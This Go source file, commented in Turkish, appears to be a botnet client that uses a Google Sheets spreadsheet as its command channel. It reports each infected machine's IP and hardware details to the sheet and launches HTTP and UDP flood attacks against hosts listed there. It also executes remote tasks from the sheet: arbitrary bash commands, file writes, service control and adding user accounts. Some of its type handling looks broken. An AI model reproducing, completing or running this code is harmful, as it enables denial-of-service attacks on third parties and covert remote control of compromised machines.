package main

import (
	"bufio"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"time"

	"golang.org/x/oauth2/google"
	"google.golang.org/api/option"
	"google.golang.org/api/sheets/v4"
)

const credentials = ""//encode ypur sheets api credentials with base64

type JSON1 struct {
	IP       string `json:"ip"`
	City     string `json:"city"`
	Region   string `json:"region"`
	Country  string `json:"country"`
	Loc      string `json:"loc"`
	Org      string `json:"org"`
	Postal   string `json:"postal"`
	Timezone string `json:"timezone"`
	Readme   string `json:"readme"`
}
type JSON2 struct {
	User        string   `json:"user"`
	Arch        string   `json:"arch"`
	CPUName     string   `json:"cpu_name"`
	CPUCore     string   `json:"cpu_core"`
	GraphicCard string   `json:"graphic_card"`
	Conf        []string `json:"conf"`
}
type Task struct {
	Name        string `json:"name"`
	Type        string `json:"type"`
	Command     string `json:"command,omitempty"`
	Path        string `json:"path,omitempty"`
	Content     string `json:"content,omitempty"`
	ServiceName string `json:"service_name,omitempty"`
	Action      string `json:"action,omitempty"`
	Username    string `json:"username,omitempty"`
}

type Config struct {
	Version string `json:"version"`
	Tasks   []Task `json:"tasks"`
}

// Terminal Komut Çalıştırıcı
func runCommand(cmdStr string) error {
	cmd := exec.Command("bash", "-c", cmdStr)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	return cmd.Run()
}

// Dosya Düzenleyici
func editFile(path, content string) error {
	return ioutil.WriteFile(path, []byte(content), 0644)
}

// Sistem Kullanıcı İşlemleri
func manageSystem(action, username string) error {
	if action == "add_user" {
		return runCommand(fmt.Sprintf("useradd %s", username))
	}
	return fmt.Errorf("bilinmeyen işlem: %s", action)
}

// Görevleri İşleme
func processTask(task Task) error {
	switch task.Type {
	case "command":
		return runCommand(task.Command)
	case "file_edit":
		return editFile(task.Path, task.Content)
	case "service":
		return runCommand(fmt.Sprintf("systemctl %s %s", task.Action, task.ServiceName))
	case "system":
		return manageSystem(task.Action, task.Username)
	default:
		return fmt.Errorf("bilinmeyen görev tipi: %s", task.Type)
	}
}

func read_sheet(srv *sheets.Service, spreadsheetId string, ddosReadRange string) ([][]interface{}, error) {
	// Veriyi oku
	resp, err := srv.Spreadsheets.Values.Get(spreadsheetId, ddosReadRange).Do()
	if err != nil {
		return nil, err
	} else {
		return resp.Values, nil
	}

}
func update_sheet(srv *sheets.Service, spreadsheetId string, updaterange string, value [][]interface{}) {
	valueRange := &sheets.ValueRange{
		Values: value,
	}

	// update cells in given range
	_, err := srv.Spreadsheets.Values.Update(spreadsheetId, updaterange, valueRange).ValueInputOption("USER_ENTERED").Do()
	if err != nil {
		log.Fatal(err)
	}

}
func write_sheet(srv *sheets.Service, spreadsheetId string, sheetName string, value [][]interface{}) {
	valueRange := &sheets.ValueRange{
		Values: value,
	}
	_, err := srv.Spreadsheets.Values.Append(spreadsheetId, sheetName, valueRange).ValueInputOption("USER_ENTERED").InsertDataOption("INSERT_ROWS").Do()
	if err != nil {
		log.Fatalf("Unable to write data to sheet: %v", err)
	}

	log.Println("Data successfully read and written")
}
func http_ddos(host string) {
	http.Get(host)

}
func udp_ddos(host string) {
	conn, err := net.Dial("udp", host)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer conn.Close()

	message := []byte("jfdkcvıjfdksjwkskıdcjfd")

	_, err = conn.Write(message)
	if err != nil {
		fmt.Println(err)
		return
	}
}
func ddos_attack(host string, ddos_type string, durations int) {
	stopChan := make(chan struct{})
	time.AfterFunc(time.Duration(durations)*time.Second, func() { close(stopChan) })

	if ddos_type == "http" {
		for {
			select {
			case <-stopChan:
				return
			default:
				http_ddos(host)
			}
		}
	}

	if ddos_type == "udp" {
		for {
			select {
			case <-stopChan:
				return
			default:
				udp_ddos(host)
			}
		}
	}
}
func read_file(file_name string) []string {
	var array []string
	readFile, err := os.Open(file_name)

	if err != nil {
		fmt.Println(err)
	}
	fileScanner := bufio.NewScanner(readFile)

	fileScanner.Split(bufio.ScanLines)

	for fileScanner.Scan() {
		array = append(array, fileScanner.Text())
	}
	return array
}
func main() {
	// JSON kimlik dosyasının yolunu belirtin

	// Kimlik doğrulama için bağlam oluştur
	ctx := context.Background()

	// Service Account kimlik bilgilerini yükleyin
	decodedCredentials, err := base64.StdEncoding.DecodeString(credentials)
	if err != nil {
		log.Fatalf("Base64 çözümleme hatası: %v", err)
	}
	config, err := google.JWTConfigFromJSON(decodedCredentials, sheets.SpreadsheetsScope)
	if err != nil {
		log.Fatalf("Failed to parse credentials file: %v", err)
	}

	client := config.Client(ctx)

	// Google Sheets API servisini başlat
	srv, err := sheets.NewService(ctx, option.WithHTTPClient(client))
	if err != nil {
		log.Fatalf("Unable to retrieve Sheets client: %v", err)
	}

	// Google Sheets ID'sini ve aralığını belirtin
	spreadsheetId := "1LE7hz7AQ6K3XhUXZYkrN56CQTAsJY7DPfj0Tyl_3y5g"
	ddosReadRange := "ddos!A:C"
	devicesReadRange := "devices!A:F"
	sheetname := "devices"

	var r JSON1

	resp, err := http.Get("https://ipinfo.io/json")
	if err != nil {
		fmt.Print(err)
	}
	defer resp.Body.Close()
	if resp.StatusCode == http.StatusOK {
		bodyBytes, err := io.ReadAll(resp.Body)
		if err != nil {
			fmt.Print(err)
		}
		bodyString := string(bodyBytes)
		json.Unmarshal([]byte(bodyString), &r)
	}

	read_ddos_sheet := func() {
		a, err := read_sheet(srv, spreadsheetId, ddosReadRange)

		if err != nil {
			log.Fatalf("err: %v", err)
		}
		for _, row := range a[1:] {
			ddos_attack(row[0].(string), row[1].(string), row[2].(int))
		}

		time.Sleep(5 * time.Second)
	}
	write_dvc_info_to_sheet := func() {
		var i JSON2

		a := read_file("dvc_info.txt")
		c := read_file("conf.txt")
		i.User = a[0]
		i.Arch = a[1]
		i.CPUName = a[2]
		i.CPUCore = a[3]
		i.GraphicCard = a[4]
		i.Conf = c
		b, err := json.Marshal(i)
		if err != nil {
			fmt.Println(err)
		}
		data := [][]interface{}{
			{r.IP, string(b), "none", time.Now()},
		}
		write_sheet(srv, spreadsheetId, sheetname, data)
	}

	read_write_devices_sheet := func() {
		found := false

		lastseencord := "devices!D"

		a, err := read_sheet(srv, spreadsheetId, devicesReadRange)

		for i, row := range a {
			if row[0] == r.IP {
				found = true

				var config Config
				if err := json.Unmarshal(row[2].([]byte), &config); err != nil {
					fmt.Println("JSON ayrıştırma hatası:", err)
					return
				}

				// Görevleri sırayla işle
				for _, task := range config.Tasks {
					fmt.Println("İşleniyor:", task.Name)
					if err := processTask(task); err != nil {
						fmt.Println("Hata:", err)
					}
				}
				lastseen := [][]interface{}{
					{time.Now()},
				}
				update_sheet(srv, spreadsheetId, lastseencord+strconv.Itoa(i+1), lastseen)
			}
		}
		if !found {
			write_dvc_info_to_sheet()
		}
		if err != nil {
			log.Fatalf("err: %v", err)
		}

		time.Sleep(5 * time.Second)

	}

	/*ip_rows, err := read_sheet(srv, spreadsheetId, "devices!A")
	if err != nil {
		log.Fatalf("err: %v", err)
	}
	found := false
	for _, i := range ip_rows {
		if i[0].(string) == r.IP {
			found = true
			break
		}
	}
	if !found {
		write_dvc_info_to_sheet()
	}*/
	for {
		go read_ddos_sheet()
		go read_write_devices_sheet()

	}

}
